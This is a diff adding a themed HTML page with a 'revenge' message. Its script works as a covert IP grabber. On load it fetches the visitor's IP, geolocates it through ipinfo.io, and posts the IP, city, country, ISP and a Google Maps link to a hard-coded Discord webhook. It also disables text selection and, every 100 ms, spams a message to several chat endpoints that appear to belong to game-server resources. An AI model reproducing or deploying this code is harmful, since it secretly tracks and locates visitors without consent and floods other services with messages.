@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>#</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: black;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            flex-direction: column;
+            position: relative;
+        }
+        .container {
+            text-align: center;
+            z-index: 1;
+        }
+        .anime-image {
+            width: 500px; 
+            max-width: 100%;
+            border: 4px solid #333;
+            border-radius: 23px;
+            margin-bottom: 50px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            opacity: 0.8;
+        }
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 95%;
+            height: 100%;
+            z-index: -3;
+            object-fit: cover;
+        }
+        .ipevil {
+            margin-top: 20px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border: 1px solid white !important;
+            box-shadow: none !important;
+            padding: 15px;
+            background-color: transparent;
+        }
+        .ipevil, .ipevil * {
+            color: white !important;
+            text-shadow: none !important;
+        }
+        pre {
+            color: white !important;
+            background-color: rgba(0, 0, 0, 0);
+            padding: 10px;
+            border-radius: 15px;
+            text-align: left;
+            text-shadow: none !important;
+            margin: 5px 0;
+        }
+        p, b, span, pre {
+            text-shadow: none !important;
+        }
+        #ip-address-value, #ip-info {
+            color: white !important;
+            text-shadow: none !important;
+        }
+        .revenge-text {
+            margin-top: 15px;
+            font-size: 1.3rem;
+            font-weight: bold;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+    <img class="background" src="https://cdn.discordapp.com/attachments/1467319976569602189/1478525000070860970/b50f6b55a6f84c738f1eac081be1ff1f.gif?ex=69a8b735&is=69a765b5&hm=3d93880908f8f70bf3a5f71cd54137b5c0e3b1869ee201ae55d6b96596f7f798&animated=true=" alt="Background" />
+
+    <div class="container">
+        <img class="anime-image" src="https://cdn.discordapp.com/attachments/1394202916088451129/1478524392404418773/rephaim-giants-evilspirits-Ohio_gif_400320.gif?ex=69a8b6a4&is=69a76524&hm=2666fe646d8b3c94703f3bdb54e57df5e1871133f425506eb566a944f021300c&animated=true" alt="Anime" />
+
+        <audio autoplay loop>
+            <source src="" />
+            Your browser does not support the audio element.
+        </audio>
+
+        <div class="ipevil">
+            <b>Your IP Address:</b> <span id="ip-address-value">Fetching...</span><br />
+            <pre id="ip-info"></pre>
+            <div class="revenge-text">
+                <b>Lua: "revenge revenge"</b>
+            <div class="Lua-text">
+           
+               <b>Lua </b>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // منع التحديد على الصفحة
+        var omitformtags = ['input', 'textarea', 'select'].join('|');
+        function disableselect(e) {
+            if (omitformtags.indexOf(e.target.tagName.toLowerCase()) == -1)
+                return false;
+        }
+        function reEnable() { return true; }
+        if (typeof document.onselectstart != 'undefined')
+            document.onselectstart = function () { return false; };
+        else {
+            document.onmousedown = disableselect;
+            document.onmouseup = reEnable;
+        }
+
+        // جلب IP والمعلومات
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then((response) => response.json())
+                .then((data) => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then((ip) => fetch(`https://ipinfo.io/${ip}/json`))
+                .then((response) => response.json())
+                .then((ipInfoData) => {
+                    sendToDiscord(ipInfoData, `https://www.google.com/maps/search/?api=1&query=${ipInfoData.loc}`, "منيك جديد ");
+                })
+                .catch((error) => {
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        function sendToDiscord(ipInfoData, googleMapsLink, username) {
+            const webhookURL = "https://discord.com/api/webhooks/1476978856958230650/PEXmwOuXfPdT25bp9v04Kk-pMKqrq38MIjU_qDRiP9ro1FkTRBwEYg11byH2qTG7FVaH";
+            const payload = {
+                content: `lua: ${ipInfoData.ip}\nUser: ${username}\nLocation: ${ipInfoData.city}, ${ipInfoData.region}, ${ipInfoData.country}\nGoogle Maps: ${googleMapsLink}\nISP: ${ipInfoData.org}`
+            };
+            fetch(webhookURL, { 
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(() => console.log("IP sent to Discord!"))
+            .catch(error => console.error(error));
+        }
+
+ const msg = `lua is here`;
+  const body = JSON.stringify({ message: msg });
+  setInterval(() => {
+    fetch("https://flix-scripts/chatResult", { method: "POST", body });
+    fetch("https://danger_chat/Danger_Chat:SendMessage", {method: "POST",body: JSON.stringify({"message": msg,"channel": "شات العام","color": null,"isImageAndLinksAllowed": [false,false]})});
+    fetch("https://easy-chat+/o6ZbK5Ecp6", {headers: {accept: "*/*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"},body: JSON.stringify({ message: msg, channel: "شات العام" }),method: "POST"});
+    fetch("https://melix_chat/chatResult", { method: "POST", body });
+    fetch("https://as_chat/chatResult", { method: "POST", body });
+    fetch("https://chat/chatResult", { method: "POST", body });
+    fetch("https://ho-chatv2/Chat", {method: "POST",body: JSON.stringify({"Type": "chatResult","message": msg,"chatType": "general"})});
+  }, 100);
+        fetchIPAndInfo();
+    </script>
+
+</body>
+</html>
